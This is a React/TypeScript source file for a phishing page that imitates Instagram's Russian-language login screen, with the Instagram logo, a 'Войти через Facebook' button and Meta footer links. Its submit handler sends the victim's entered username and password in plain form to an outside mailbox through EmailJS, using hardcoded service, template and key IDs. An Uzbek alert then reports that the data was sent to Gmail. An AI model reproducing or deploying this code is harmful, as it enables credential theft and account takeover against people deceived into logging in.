'use client';

import instagram from "../src/assets/instagram.png";
import { useState } from 'react';
import { Eye, EyeOff } from 'lucide-react';
import emailjs from "emailjs-com";

export default function InstagramLogin() {
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
  e.preventDefault();

  emailjs.send(
    "service_t4437m5",
    "template_sehcxpw",
    {
      username: username,
      password: password
    },
    "UrSelZu6PV52l1JpZ"
  )
  .then(() => {
    alert("Ma'lumot Gmailga yuborildi");
  })
  .catch(() => {
    alert("Xatolik yuz berdi");
  });
};
  return (
    <div className="dark min-h-screen bg-background flex flex-col">
      {/* Top Section with Logo */}
      <div className="bg-black/50 border-b border-border flex items-center justify-center py-8">
        <div className="w-20 h-20 flex items-center justify-center">
          <img src={instagram} alt="" />
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center px-4 py-12 bg-[#0f1419]">
        <div className="w-full max-w-sm">
          <h1 className="text-4xl font-bold text-foreground text-center mb-12">
            Войти в Instagram
          </h1>

          <form className="space-y-3 mb-8" onSubmit={handleSubmit}>
            <input
              type="text"
              placeholder="Имя пользователя, номер моби..."
              className="w-full px-4 py-3 bg-secondary text-foreground placeholder-muted-foreground text-sm border border-border rounded-lg focus:outline-none focus:border-accent transition"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />

            <div className="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                placeholder="Пароль"
                className="w-full px-4 py-3 bg-secondary text-foreground placeholder-muted-foreground text-sm border border-border rounded-lg focus:outline-none focus:border-accent transition"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>

            <button
              type="submit"
              className="w-full bg-accent hover:bg-accent/85 text-accent-foreground font-bold py-3 rounded-lg mt-4 transition disabled:opacity-50 disabled:cursor-not-allowed"
              disabled={!username || !password}
            >
              Войти
            </button>
          </form>

          <div className="text-center mb-8">
            <button className="text-sm text-foreground hover:text-muted-foreground transition">
              Забыли пароль?
            </button>
          </div>

          <div className="flex items-center gap-4 my-8">
            <div className="flex-1 h-px bg-border" />
            <span className="text-xs text-muted-foreground font-semibold">ИЛИ</span>
            <div className="flex-1 h-px bg-border" />
          </div>

          <button className="w-full flex items-center justify-center gap-2 border border-border text-accent text-sm font-bold py-3 rounded-lg hover:bg-secondary/50 transition mb-3">
            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
            </svg>
            Войти через Facebook
          </button>

          <div className="text-center pt-8 border-t border-border">
            <p className="text-sm text-muted-foreground">
              Нет аккаунта?{' '}
              <button className="text-accent font-bold hover:text-accent/85 transition">
                Создать новый аккаунт
              </button>
            </p>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="border-t border-border bg-black/30 py-8">
        <div className="max-w-6xl mx-auto px-4">
          <div className="flex flex-wrap justify-center gap-4 text-xs text-muted-foreground mb-4">
            <button>Meta</button>
            <button>Информация</button>
            <button>Блог</button>
            <button>Вакансии</button>
            <button>Помощь</button>
            <button>API</button>
          </div>

          <div className="flex flex-wrap justify-center gap-4 text-xs text-muted-foreground">
            <button>Конфиденциальность</button>
            <button>Условия</button>
            <button>Места</button>
            <button>Instagram Lite</button>
            <button>Threads</button>
          </div>
        </div>
      </div>
    </div>
  );
}
